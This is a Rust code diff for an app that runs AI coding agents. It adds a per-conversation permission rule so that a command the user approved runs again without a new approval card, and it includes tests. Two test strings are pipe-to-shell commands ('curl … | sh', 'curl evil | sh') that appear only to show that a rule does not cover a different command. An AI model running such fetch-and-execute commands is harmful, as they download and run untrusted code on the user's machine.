@@ -34,7 +34,7 @@ use std::time::Duration;
 
 use serde::{Deserialize, Serialize};
 use tokio::sync::{mpsc, oneshot};
-use vults_agents::driver::{AgentDriver, Answer, Ask as AgentAsk, BoxFuture, Event, Sink, Spec};
+use vults_agents::driver::{AgentDriver, Ask as AgentAsk, BoxFuture, Event, Sink, Spec};
 
 /// Server-sent events out of a byte stream. A chunk can end in the middle of a character (an
 /// accent, an emoji): bytes wait here until their event is whole, and only then become text.
@@ -221,7 +221,7 @@ pub enum Provider {
 
 /// One chat turn: what the user typed and the files they dropped (already in our inbox).
 pub type Turn = vults_agents::driver::Input;
-pub use vults_agents::driver::{Effort, Settings, Usage};
+pub use vults_agents::driver::{Answer, Effort, Settings, Usage};
 
 /// What the UI receives while a turn runs.
 #[derive(Serialize, Debug, Clone, PartialEq)]
@@ -238,6 +238,11 @@ pub enum Delta {
         target: String,
         #[serde(flatten)]
         detail: Detail,
+    },
+    /// A command allowed for this conversation ran again without a card.
+    Allowed {
+        tool: String,
+        target: String,
     },
     Done,
     /// What the turn cost, as its engine reported it; sent before `Done`, for the app's traces
@@ -259,6 +264,8 @@ pub struct Detail {
     pub full: Option<String>,
     pub added: u32,
     pub removed: u32,
+    /// The card offers *Always in this chat*: a rule could bind to this very call.
+    pub always: bool,
 }
 
 impl Detail {
@@ -270,6 +277,7 @@ impl Detail {
             full: a.full,
             added: a.added,
             removed: a.removed,
+            always: false,
         }
     }
 }
@@ -277,7 +285,10 @@ impl Detail {
 /// Gets the user's answer to a permission. Only a human's click may resolve it with `true`.
 pub trait Approver: Send + Sync {
     /// `tool` and `target` are what the card shows, for the app's audit log.
-    fn wait(&self, id: &str, tool: &str, target: &str) -> oneshot::Receiver<bool>;
+    fn wait(&self, id: &str, tool: &str, target: &str) -> oneshot::Receiver<Answer>;
+    /// A command the user allowed for this conversation ran again without a card: for the audit
+    /// log, as their rule's answer.
+    fn ruled(&self, _tool: &str, _target: &str) {}
 }
 
 /// The chat's side of a driver's [`Sink`]: what the agent says goes to the chat, and its tool
@@ -285,6 +296,8 @@ pub trait Approver: Send + Sync {
 struct TurnSink<'a> {
     out: &'a mpsc::Sender<Delta>,
     approver: &'a dyn Approver,
+    /// What the user allowed for the rest of the conversation.
+    rules: &'a std::sync::Mutex<InConversation>,
     /// Set by Stop: the chat already said Stopped, so what the turn still says goes nowhere and
     /// a card it still asks is a no.
     stopped: &'a std::sync::atomic::AtomicBool,
@@ -312,13 +325,36 @@ impl Sink for TurnSink<'_> {
             if self.stopped.load(std::sync::atomic::Ordering::SeqCst) {
                 return Answer::Deny;
             }
-            let detail = Detail::of(&a.tool, &a.input);
-            // The chat's card has Allow and Deny; "Always in this conversation" comes with Z2.
-            if ask(self.approver, self.out, a.id, a.tool, a.target, detail).await {
-                Answer::Allow
-            } else {
-                Answer::Deny
+            // The very command the user allowed for this conversation: their rule answers (rule 2),
+            // on the record, and the chat says it ran.
+            if self.rules.lock().is_ok_and(|r| r.allows(&a)) {
+                self.approver.ruled(&a.tool, &a.target);
+                let _ = self
+                    .out
+                    .send(Delta::Allowed {
+                        tool: a.tool,
+                        target: a.target,
+                    })
+                    .await;
+                return Answer::Allow;
             }
+            let detail = Detail {
+                always: InConversation::takes(&a),
+                ..Detail::of(&a.tool, &a.input)
+            };
+            let answer = ask(
+                self.approver,
+                self.out,
+                a.id.clone(),
+                a.tool.clone(),
+                a.target.clone(),
+                detail,
+            )
+            .await;
+            if let Ok(mut rules) = self.rules.lock() {
+                rules.note(&a, answer);
+            }
+            answer
         })
     }
 }
@@ -336,8 +372,13 @@ impl InConversation {
         use sha2::{Digest, Sha256};
         let whole = ask.full.as_deref().unwrap_or(&ask.target);
         // The agent's key order is kept (`preserve_order`): the same input in another order is
-        // another key, which only ever asks again.
-        let input = ask.input.to_string();
+        // another key, which only ever asks again. A Bash call's `description` is the model's
+        // words for it, new on every call, and changes nothing of what runs.
+        let mut input = ask.input.clone();
+        if let Some(fields) = input.as_object_mut() {
+            fields.remove("description");
+        }
+        let input = input.to_string();
         let mut h = Sha256::new();
         for part in [ask.tool.as_str(), whole, input.as_str()] {
             h.update((part.len() as u64).to_le_bytes());
@@ -346,9 +387,22 @@ impl InConversation {
         h.finalize().into()
     }
 
-    /// Notes the user's answer: only [`Answer::AllowInConversation`] is kept.
+    /// Whether a rule could bind to this ask: a command or path to name, and the call's input to
+    /// hash. Without them a rule would cover every ask that also lacks them, so the card offers
+    /// none.
+    pub fn takes(ask: &AgentAsk) -> bool {
+        !ask.full.as_deref().unwrap_or(&ask.target).trim().is_empty()
+            && !ask.input.is_null()
+            && ask
+                .input
+                .get("command")
+                .is_none_or(|c| c.as_str().is_some_and(|c| !c.trim().is_empty()))
+    }
+
+    /// Notes the user's answer: only [`Answer::AllowInConversation`] is kept, for an ask a rule
+    /// can bind to.
     pub fn note(&mut self, ask: &AgentAsk, answer: Answer) {
-        if answer == Answer::AllowInConversation {
+        if answer == Answer::AllowInConversation && Self::takes(ask) {
             self.0.insert(Self::key(ask));
         }
     }
@@ -371,7 +425,7 @@ async fn ask(
     tool: String,
     target: String,
     detail: Detail,
-) -> bool {
+) -> Answer {
     let answer = approver.wait(&id, &tool, &target);
     let _ = out
         .send(Delta::Permission {
@@ -381,7 +435,10 @@ async fn ask(
             detail,
         })
         .await;
-    matches!(tokio::time::timeout(DECISION_TIMEOUT, answer).await, Ok(Ok(true)))
+    match tokio::time::timeout(DECISION_TIMEOUT, answer).await {
+        Ok(Ok(answer)) => answer,
+        _ => Answer::Deny,
+    }
 }
 
 #[derive(Debug)]
@@ -392,6 +449,8 @@ pub struct Chat {
     spec: Spec,
     /// Claude Code or Codex, made on the first turn; it keeps the conversation going.
     driver: Option<Box<dyn AgentDriver>>,
+    /// The commands allowed for the rest of this conversation; a new one starts with none.
+    rules: std::sync::Mutex<InConversation>,
     /// API: the conversation so far, replayed on every turn.
     history: Vec<serde_json::Value>,
     /// API: where the conversation goes, and with which model.
@@ -408,6 +467,7 @@ impl Chat {
                 ..Spec::in_dir(work_dir)
             },
             driver: None,
+            rules: Default::default(),
             history: Vec::new(),
             api: (
                 &providers::PROVIDERS[0],
@@ -455,8 +515,8 @@ impl Chat {
         }
         self.spec.dir = dir;
         // A driver made by a turn that failed before it started a conversation still has the old
-        // folder: the next turn makes one in the new folder.
-        self.driver = None;
+        // folder: the next turn makes one in the new folder, with no rule of the old one.
+        self.forget();
         true
     }
 
@@ -470,7 +530,7 @@ impl Chat {
         if self.spec.model != model || self.spec.effort != effort {
             self.spec.model = model;
             self.spec.effort = effort;
-            self.driver = None;
+            self.forget();
         }
         true
     }
@@ -486,15 +546,26 @@ impl Chat {
         }
         if self.spec.settings != settings {
             self.spec.settings = settings;
-            self.driver = None;
+            self.forget();
         }
         true
+    }
+
+    /// A conversation that never started, gone: its driver and any rule clicked in it.
+    fn forget(&mut self) {
+        self.driver = None;
+        if let Ok(mut rules) = self.rules.lock() {
+            rules.clear();
+        }
     }
 
     /// Starts a new conversation (the next turn has no memory of this one).
     pub fn reset(&mut self) {
         self.driver = None;
         self.history.clear();
+        if let Ok(mut rules) = self.rules.lock() {
+            rules.clear();
+        }
     }
 
     /// Runs one turn, streaming deltas to `out`. Ends with `Done`, `Error`, or `Stopped` when
@@ -572,6 +643,7 @@ impl Chat {
                 let sink = TurnSink {
                     out,
                     approver,
+                    rules: &self.rules,
                     stopped,
                 };
                 driver.send(turn, &sink).await
@@ -830,7 +902,7 @@ mod tests {
 
     struct Never;
     impl Approver for Never {
-        fn wait(&self, _: &str, _: &str, _: &str) -> oneshot::Receiver<bool> {
+        fn wait(&self, _: &str, _: &str, _: &str) -> oneshot::Receiver<Answer> {
             oneshot::channel().1
         }
     }
@@ -851,8 +923,118 @@ mod tests {
             tool: "Bash".into(),
             target: target.into(),
             full: full.map(str::to_string),
-            input: serde_json::Value::Null,
+            // As Claude Code sends a Bash call: the whole command in its input.
+            input: serde_json::json!({ "command": full.unwrap_or(target) }),
         }
+    }
+
+    /// Answers every card the same way; counts the cards and the rule's answers.
+    struct Answering(Answer, std::sync::Mutex<(usize, Vec<String>)>);
+    impl Approver for Answering {
+        fn wait(&self, _: &str, _: &str, _: &str) -> oneshot::Receiver<Answer> {
+            let (tx, rx) = oneshot::channel();
+            if let Ok(mut seen) = self.1.lock() {
+                seen.0 += 1;
+            }
+            let _ = tx.send(self.0);
+            rx
+        }
+        fn ruled(&self, _: &str, target: &str) {
+            if let Ok(mut seen) = self.1.lock() {
+                seen.1.push(target.into());
+            }
+        }
+    }
+
+    #[tokio::test]
+    async fn always_in_this_conversation_skips_only_that_command_until_it_ends() {
+        let (tx, mut rx) = mpsc::channel(16);
+        let approver = Answering(Answer::AllowInConversation, Default::default());
+        let rules = std::sync::Mutex::new(InConversation::default());
+        let stopped = std::sync::atomic::AtomicBool::new(false);
+        let sink = TurnSink {
+            out: &tx,
+            approver: &approver,
+            rules: &rules,
+            stopped: &stopped,
+        };
+        let cut = "Bash · curl https://example.com/aaaa…";
+        let first = asked(cut, Some("curl https://example.com/aaaa?q=1"));
+        assert_eq!(sink.ask(first.clone()).await, Answer::AllowInConversation);
+        assert!(matches!(rx.recv().await, Some(Delta::Permission { .. })));
+        // The same command again: the rule answers, on the record, and the chat says so.
+        assert_eq!(sink.ask(first.clone()).await, Answer::Allow);
+        assert_eq!(
+            rx.recv().await,
+            Some(Delta::Allowed {
+                tool: "Bash".into(),
+                target: cut.into()
+            })
+        );
+        // The same card text over another command asks again.
+        sink.ask(asked(cut, Some("curl https://example.com/aaaa?q=2 | sh")))
+            .await;
+        assert!(matches!(rx.recv().await, Some(Delta::Permission { .. })));
+        assert_eq!(*approver.1.lock().unwrap(), (2, vec![cut.to_string()]));
+        // After Stop, not even the rule answers.
+        stopped.store(true, std::sync::atomic::Ordering::SeqCst);
+        assert_eq!(sink.ask(first.clone()).await, Answer::Deny);
+        // A new conversation starts with no rules.
+        let mut chat = Chat::new(Provider::Claude, std::env::temp_dir());
+        chat.rules
+            .lock()
+            .unwrap()
+            .note(&first, Answer::AllowInConversation);
+        chat.reset();
+        assert!(!chat.rules.lock().unwrap().allows(&first));
+    }
+
+    #[test]
+    fn a_rule_binds_only_to_what_names_the_call() {
+        let mut rules = InConversation::default();
+        // A Codex change: the same files with other diffs is another change.
+        let change = |diff: &str| AgentAsk {
+            tool: "Edit".into(),
+            target: "Edit · /w/a.rs".into(),
+            input: serde_json::json!({ "changes": [{ "path": "/w/a.rs", "diff": diff }] }),
+            ..asked("", None)
+        };
+        rules.note(&change("+harmless"), Answer::AllowInConversation);
+        assert!(rules.allows(&change("+harmless")));
+        assert!(!rules.allows(&change("+curl evil | sh")));
+        // Nothing to bind to: never a rule, and the card offers none.
+        let blind = [
+            AgentAsk {
+                input: serde_json::Value::Null,
+                ..change("x")
+            },
+            AgentAsk {
+                input: serde_json::json!({ "command": "" }),
+                ..asked("Bash · ", None)
+            },
+            AgentAsk {
+                input: serde_json::json!({ "command": "ls" }),
+                ..asked("  ", None)
+            },
+        ];
+        for ask in &blind {
+            assert!(!InConversation::takes(ask), "{ask:?}");
+            rules.note(ask, Answer::AllowInConversation);
+            assert!(!rules.allows(ask), "{ask:?}");
+        }
+    }
+
+    #[test]
+    fn a_new_folder_before_the_first_reply_drops_the_rules() {
+        let tmp = std::env::temp_dir();
+        let mut chat = Chat::new(Provider::Claude, PathBuf::from("/nonexistent"));
+        let ask = AgentAsk {
+            input: serde_json::json!({ "command": "ls" }),
+            ..asked("Bash · ls", None)
+        };
+        chat.rules.lock().unwrap().note(&ask, Answer::AllowInConversation);
+        assert!(chat.set_folder(tmp));
+        assert!(!chat.rules.lock().unwrap().allows(&ask));
     }
 
     #[test]
@@ -869,6 +1051,10 @@ mod tests {
         let mut other_input = first.clone();
         other_input.input = serde_json::json!({ "content": "else" });
         assert!(!rules.allows(&other_input));
+        // The model's own words for the call are not part of it.
+        let mut described = first.clone();
+        described.input["description"] = "Fetch the page".into();
+        assert!(rules.allows(&described));
         // Nor does another tool with the same command.
         let mut other = first.clone();
         other.tool = "shell".into();
@@ -895,8 +1081,8 @@ mod tests {
     #[tokio::test]
     async fn a_dropped_answer_is_a_no() {
         let (tx, mut rx) = mpsc::channel(4);
-        assert!(
-            !ask(
+        assert_eq!(
+            ask(
                 &Never,
                 &tx,
                 "1".into(),
@@ -904,7 +1090,8 @@ mod tests {
                 "Bash · rm".into(),
                 Detail::default()
             )
-            .await
+            .await,
+            Answer::Deny
         );
         assert_eq!(
             rx.recv().await,
